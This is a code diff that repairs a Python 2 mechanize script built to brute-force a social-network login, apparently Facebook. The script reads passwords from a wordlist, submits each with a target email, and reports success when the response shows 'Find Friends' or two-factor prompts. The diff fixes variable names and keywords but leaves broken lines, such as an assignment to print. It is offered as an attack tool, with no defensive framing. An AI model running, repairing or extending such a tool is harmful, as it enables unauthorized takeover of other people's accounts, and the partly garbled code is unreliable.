@@ -1,6 +1,5 @@
 import sys
-from ast import Break, Continue
-from urllib import open, request, select
+from ast import Break
 import time
 if sys.version_info[0] !=2: 
 	print('''--------------------------------------
@@ -18,9 +17,9 @@ headers = {
 try:
 	import urllib
 	import mechanize
-	urllib = mechanize.Browser()
-	urllib.addheaders = [('User-Agent',headers['User-Agent'])]
-	urllib.set_handle_robots(False)
+	browser = mechanize.Browser()
+	browser.addheaders = [('User-Agent',headers['User-Agent'])]
+	browser.set_handle_robots(False)
 except:
 	print('\n\tPlease install mechanize.\n')
 
@@ -35,15 +34,15 @@ while file:
 	passw=file.readline().strip()
 	i+=1
 	if len(passw) < 6:
-		Continue
-	print ;str (i) +" : ",passw
-	response = urllib.open(post_url)
+		continue
+	print=str(i) +" : ",passw
+	response = browser.open(post_url)
 	try:
 		if response.code == 200:
-			urllib.select_form(nr=0)
-			urllib.form['email'] = email
-			urllib.form['pass'] = passw
-			response = urllib.submit()
+			browser.select_form(nr=0)
+			browser.form['email'] = email
+			browser.form['pass'] = passw
+			response = browser.submit()
 			response_data = response.read()
 			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
 				print('Your password is : ',passw)
